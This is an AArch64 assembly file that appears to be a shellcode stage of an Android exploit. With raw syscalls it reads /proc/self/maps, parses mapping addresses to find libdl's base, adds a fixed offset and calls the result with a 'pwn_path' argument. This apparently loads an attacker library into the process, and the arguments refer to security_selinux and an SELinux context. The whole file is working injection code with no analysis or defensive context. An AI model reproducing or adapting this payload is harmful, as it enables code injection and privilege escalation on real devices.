.include "libselinux.inc"

_start:
    mov x19, x0 // pwn_path
    mov x20, x1 // proc_self_maps
    mov x21, x2 // libdl
    mov x23, x3 // security_selinux
    mov x24, x4 // context

    str x28, [sp, -0x20]!
    stp x29, x30, [sp, 0x10]
    add x29, sp, 0x10
    sub sp, sp, 0x3f0

    mov x0, -0x64
    mov x2, xzr
    mov x3, xzr
    mov x1, x20
    mov w8, SYS_openat
    svc 0

    sxtw x9, w0
    mov x0, x9
    sub x1, x29, 4
    mov w8, SYS_read
    mov w2, 1
    svc 0

    cmp x0, 1
    b.lt _8e0

    add x10, sp, 8
    mov w15, wzr
    mov w11, 0x3e7
    mov w12, 0x1014
    orr x13, x10, 1
    mov x14, x21
    ldurb w8, [x29, -4]
    cmp w8, 0xa
    b.eq _794
    b _824

_768:
    add w15, w15, 1

_76c:
    mov x0, x9
    sub x1, x29, 4
    mov w8, SYS_read
    mov w2, 1
    svc 0
    cmp x0, 0
    b.le _8e0

    ldurb w8, [x29, -4]
    cmp w8, 0xa
    b.ne _824

_794:
    cmp w15, 0x3e7
    csel w8, w15, w11, lt
    cmp w15, 1
    strb wzr, [x10, w8, sxtw]
    b.lt _8d8

    ldrb w15, [sp, 8]
    cbz w15, _834

    mov x8, xzr
    mov x16, x13
    mov w17, w15
    and w0, w17, 0xff
    cmp w0, 0x2d
    b.ne _7e8
    b _838

_7cc:
    add x8, x8, x17
    sub x8, x8, 0x30

_7d4:
    ldrb w17, [x16], 1
    cbz w17, _838

_7dc:
    and w0, w17, 0xff
    cmp w0, 0x2d
    b.eq _838

_7e8:
    and x17, x17, 0xff
    sub w0, w17, 0x30
    and w0, w0, 0xff
    cmp w0, 9
    lsl x8, x8, 4
    b.ls _7cc

    sub w0, w17, 0x61
    and w0, w0, 0xff
    cmp w0, 5
    b.hi _7d4

    add x8, x8, x17
    sub x8, x8, 0x57
    ldrb w17, [x16], 1
    cbnz w17, _7dc
    b _838

_824:
    cmp w15, 0x3e6
    b.hi _768

    strb w8, [x10, w15, sxtw]
    b _768

_834:
    mov x8, xzr

_838:
    add x17, sp, 8
    and w15, w15, 0xff
    cmp w15, 0x6c
    add x16, x17, 1
    b.ne _874
    b _890

_850:
    mov w0, 0x69

_854:
    cmp w0, 0
    csetm w3, ne

_85c:
    mov x17, x16
    cbz w3, _8d0

    and w15, w15, 0xff
    cmp w15, 0x6c
    add x16, x17, 1
    b.eq _890

_874:
    cbz w15, _76c
    ldrb w15, [x16]
    mov x17, x16
    and w15, w15, 0xff
    cmp w15, 0x6c
    add x16, x17, 1
    b.ne _874

_890:
    ldrb w15, [x16]
    cbz w15, _850
    mov w0, 0x69
    mov w1, 2
    mov w2, w15

_8a4:
    tst w0, 0xff
    mov w3, 1
    b.eq _85c

    and w0, w0, 0xff
    cmp w0, w2, uxtb
    b.ne _85c

    ldrb w2, [x17, x1]
    ldrb w0, [x14, x1]
    add x1, x1, 1
    cbnz w2, _8a4
    b _854

_8d0:
    adds x8, x8, x12
    b.ne _900

_8d8:
    mov w15, wzr
    b _76c

_8e0:
    mov x0, x9
    mov w8, SYS_close
    svc 0

_8ec:
    mov w0, wzr
    add sp, sp, 0x3f0
    ldp x29, x30, [sp, 0x10]
    ldr x28, [sp], 0x20

    mov x0, xzr
    mov x8, SYS_exit
    svc 0

    ret

_900:
    mov x0, x19
    mov x1, 2
    blr x8
    b _8ec
